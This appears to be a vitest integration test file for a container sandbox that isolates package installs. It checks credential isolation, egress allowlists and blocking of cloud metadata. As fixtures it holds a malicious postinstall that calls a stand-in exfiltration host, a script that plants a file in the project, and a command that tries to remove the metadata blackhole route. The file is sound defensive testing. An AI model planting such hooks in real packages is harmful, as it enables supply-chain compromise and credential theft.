import { existsSync } from 'node:fs';
import { spawnSync } from 'node:child_process';
import path from 'node:path';
import { beforeAll, describe, expect, it } from 'vitest';
import { PACKAGE_ROOT, dockerAvailable, fixture, probeFixture, runCli } from './helpers.js';

const hasDocker = dockerAvailable();

describe.skipIf(!hasDocker)('docker integration', () => {
  beforeAll(async () => {
    // Rebuild images so Dockerfile changes (corepack PMs) are in effect.
    const { code } = await runCli(PACKAGE_ROOT, ['build']);
    expect(code).toBe(0);
  });

  // Cross-package-manager: a tiny real dependency installs cleanly in-container.
  it.each<{ pm: string; files: Record<string, string> }>([
    { pm: 'npm', files: {} },
    { pm: 'pnpm', files: { 'pnpm-lock.yaml': '' } },
    { pm: 'yarn', files: { 'yarn.lock': '' } },
  ])('installs with $pm', async ({ pm, files }) => {
    const dir = fixture({
      'package.json': JSON.stringify({ name: 't', private: true, dependencies: { 'is-number': '^7.0.0' } }),
      'sandbox.config.json': JSON.stringify({ install: { network: 'on' } }),
      ...files,
    });
    // Explicit pm form forces the container (the everyday `install` is mode-aware and a fresh project
    // would install natively). This test is about the contained path, so force it.
    const { code, stderr } = await runCli(dir, [pm, 'install']);
    expect(code, stderr).toBe(0);
    expect(existsSync(path.join(dir, 'node_modules', 'is-number'))).toBe(true);
    // Golden action line: one line before the write, naming where it runs and the boundary it buys.
    expect(stderr).toContain(`installing in a throwaway container with ${pm} (no deps yet; no host creds, default-deny egress)`);
  });

  // Frozen reproducible install: npm gets a fully read-only source tree; pnpm keeps a
  // writable root (it writes a temp there even when frozen) but never mutates the lockfile.
  it.each<{ pm: string; files: Record<string, string> }>([
    { pm: 'npm', files: {} },
    { pm: 'pnpm', files: { 'pnpm-lock.yaml': '' } },
  ])('frozen install with $pm', async ({ pm, files }) => {
    const dir = fixture({
      'package.json': JSON.stringify({ name: 't', private: true, dependencies: { 'is-number': '^7.0.0' } }),
      'sandbox.config.json': JSON.stringify({ install: { network: 'on' } }),
      ...files,
    });
    // Force the container (explicit pm) for both the seed and the frozen install: this is the contained
    // reproducible-install path.
    expect((await runCli(dir, [pm, 'install'])).code).toBe(0); // seed the lockfile
    const { code, stderr } = await runCli(dir, ['--frozen', pm, 'install']);
    expect(code, stderr).toBe(0);
    expect(existsSync(path.join(dir, 'node_modules', 'is-number'))).toBe(true);
  });

  it('--frozen without a lockfile fails fast with guidance (native path enforces it too)', async () => {
    // Friendly `install` on a fresh project is mode-aware (native), and the native path enforces the
    // same frozen-needs-a-lockfile invariant as the contained one.
    const dir = fixture({ 'package.json': '{"name":"t"}' });
    const { code, stderr } = await runCli(dir, ['--frozen', 'install']);
    expect(code).toBe(1);
    expect(stderr).toMatch(/reproducible install needs a committed package-lock\.json/);
  });

  it('contains a malicious postinstall: no creds, no repo persistence, no pollution', async () => {
    const dir = probeFixture({ install: { network: 'on' } });
    const { code, stdout } = await runCli(dir, ['npm', 'install', '--foreground-scripts']);
    expect(code).toBe(0);
    expect(stdout).toContain('PROBE creds=0');
    expect(stdout).toContain('persist=BLOCKED');
    // the read-only-volume blockers must not litter the repo with empty dirs
    for (const p of ['.git', '.github', '.husky', '.claude', '.vscode']) {
      expect(existsSync(path.join(dir, p)), `leaked ${p}`).toBe(false);
    }
  });

  it('surfaces blocked egress as a tripwire and --fail-on-egress exits non-zero', async () => {
    const dir = fixture({
      'package.json': JSON.stringify({ name: 't', private: true, dependencies: { 'bad-dep': 'file:./bad-dep' } }),
      'sandbox.config.json': JSON.stringify({ install: { network: 'allowlist' }, egress: { allow: ['npmjs.org', 'npmjs.com'] } }),
      // postinstall uses npm (which honours the proxy) to reach a non-allowlisted host.
      'bad-dep/package.json': JSON.stringify({
        name: 'bad-dep',
        version: '1.0.0',
        scripts: { postinstall: 'npm ping --registry=https://exfil.example.com/ || true' },
      }),
    });

    const warned = await runCli(dir, ['npm', 'install', '--foreground-scripts']);
    expect(warned.code).toBe(0); // install itself succeeds
    expect(warned.stderr).toMatch(/blocked \d+ network request/i); // what happened
    expect(warned.stderr).toContain('exfil.example.com');
    expect(warned.stderr).toContain('Allow it for this repo:'); // what to type next: the persistent fix
    expect(warned.stderr).toContain('sandbox allow exfil.example.com');
    expect(warned.stderr).toContain('--full-network'); // and the one-off escape hatch
    expect(warned.stderr).toContain('"exfil.example.com"'); // allowlist snippet

    const failed = await runCli(dir, ['--fail-on-egress', 'npm', 'install', '--foreground-scripts']);
    expect(failed.code).toBe(1);
  });

  it('summarizes unexpected source-tree changes made during install', async () => {
    const dir = fixture({
      'package.json': JSON.stringify({ name: 't', private: true, dependencies: { 'bad-dep': 'file:./bad-dep' } }),
      'sandbox.config.json': JSON.stringify({ install: { network: 'on' } }),
      'src/index.js': 'console.log("safe")\n',
      'bad-dep/package.json': JSON.stringify({
        name: 'bad-dep',
        version: '1.0.0',
        scripts: { postinstall: 'node tamper.js' },
      }),
      'bad-dep/tamper.js': 'require("node:fs").writeFileSync("/workspace/src/persist.js", "owned\\n");\n',
    });

    const { code, stderr } = await runCli(dir, ['npm', 'install', '--foreground-scripts']);
    expect(code).toBe(0);
    expect(stderr).toMatch(/install changed 1 project file/);
    expect(stderr).toContain('src/persist.js');
  });

  it('blocks exfiltration to a non-allowlisted host (allowlist egress)', async () => {
    const dir = probeFixture({
      install: { network: 'allowlist' },
      egress: { allow: ['npmjs.org', 'npmjs.com'] },
    });
    const { code, stdout } = await runCli(dir, ['npm', 'install', '--foreground-scripts']);
    expect(code).toBe(0);
    expect(stdout).toContain('PROBE egress=BLOCKED');
    expect(stdout).toContain('persist=BLOCKED');
  });

  it('blackholes cloud metadata (IMDS) in full-network/on mode', async () => {
    // In "on"/full-network the container is on the default bridge with a route to the host's
    // link-local metadata endpoint — the cloud-credential-theft vector. The guard
    // installs blackhole routes (then drops all caps so they can't be removed).
    const dir = fixture({ 'package.json': '{"name":"t"}' });
    const { code, stdout } = await runCli(dir, ['--full-network', 'run', '--', 'sh', '-c', 'ip route show table all']);
    expect(code).toBe(0);
    expect(stdout).toContain('blackhole 169.254.169.254'); // AWS/GCP/Azure/Oracle/DO IMDS
    expect(stdout).toContain('blackhole 169.254.170.2'); // ECS task metadata
  });

  it('user code in full-network mode cannot undo the metadata block (caps dropped)', async () => {
    const dir = fixture({ 'package.json': '{"name":"t"}' });
    // A would-be attacker tries to delete the blackhole route; with zero caps it fails.
    const { stdout } = await runCli(dir, ['--full-network', 'run', '--', 'sh', '-c', 'ip route del blackhole 169.254.169.254/32 2>&1 || echo CANNOT_UNDO']);
    expect(stdout).toContain('CANNOT_UNDO');
  });

  it('the shipped example projects pass for real across package managers', () => {
    const runner = path.join(PACKAGE_ROOT, 'examples', 'run.mjs');
    const result = spawnSync(process.execPath, [runner, '--real'], { encoding: 'utf8', stdio: 'inherit' });
    expect(result.status).toBe(0);
  });

  // The real-execution path for `sandbox demo`: every attack runs in an actual container through the
  // same execute()/planRun() path a real install uses. Deterministic offline — the egress scenario's
  // host is refused by the proxy filter (no DNS needed) and the IMDS probe just times out.
  it('demo contains every attack scenario for real', async () => {
    const { code, stdout, stderr } = await runCli(PACKAGE_ROOT, ['demo']);
    const out = `${stdout}\n${stderr}`;
    expect(out, out).toMatch(/all \d+ attack\(s\) contained/);
    expect(out).not.toMatch(/NOT CONTAINED/);
    expect(code, out).toBe(0);
  }, 240_000);
});

describe.skipIf(hasDocker)('docker integration (skipped)', () => {
  it('needs a running container runtime', () => {
    expect(hasDocker).toBe(false);
  });
});
